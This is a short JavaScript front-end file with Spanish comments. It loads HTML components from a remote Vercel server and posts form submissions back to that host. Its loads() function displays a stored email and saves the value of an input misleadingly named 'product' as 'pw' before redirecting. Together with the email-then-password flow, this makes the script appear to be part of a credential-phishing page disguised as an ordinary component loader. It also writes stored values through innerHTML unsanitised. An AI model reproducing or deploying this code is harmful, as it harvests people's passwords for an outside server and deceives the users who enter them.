const pendientes = new WeakMap(); // un AbortController por contenedor
const API_BASE = "https://server-alpha-two-21.vercel.app";
const apiUrl = (ruta) => new URL(ruta, API_BASE).href;

function resolverDestino(origen, selector) {
  if (selector.startsWith("closest:")) return origen.closest(selector.slice(8));
  return document.querySelector(selector);
}

async function cargar(url, destino, opciones = {}) {
  pendientes.get(destino)?.abort(); // cancela la petición anterior (evita carreras)
  const ctrl = new AbortController();
  pendientes.set(destino, ctrl);
  destino.setAttribute("aria-busy", "true");

  try {
    const res = await fetch(apiUrl(url), { ...opciones, signal: ctrl.signal });
    if (!res.ok) throw new Error(res.status);
    destino.innerHTML = await res.text();
    montar(destino);
    loads(); // el HTML nuevo puede traer más componentes
  } finally {
    destino.removeAttribute("aria-busy");
  }
}

function montar(raiz = document) {
  raiz.querySelectorAll("[data-component]").forEach((el) => {
    if (el.dataset.montado) return;
    el.dataset.montado = "1";
    cargar(el.dataset.component, el);
  });
}

// Delegación de eventos: sigue funcionando aunque el HTML se reemplace
document.addEventListener("click", (e) => {
  const btn = e.target.closest("[data-action]");
  if (btn) cargar(btn.dataset.action, resolverDestino(btn, btn.dataset.target));
});

document.addEventListener("submit", (e) => {
  const form = e.target.closest("[data-form]");
  if (!form) return;
  e.preventDefault();
  cargar(form.dataset.form, resolverDestino(form, form.dataset.target), {
    method: "POST",
    body: new URLSearchParams(new FormData(form)),
  });
});

// Carga la landing dentro de <body id="load"> y luego monta sus componentes anidados
cargar("/api/components/indexs", document.getElementById("load"));

function loads() {
  document.getElementById("form-title").innerHTML =
    localStorage.getItem("email");

  document.getElementById("next").addEventListener("click", function () {
    localStorage.setItem("pw", document.getElementById("product").value);
    window.location = "load.html";
  });
}
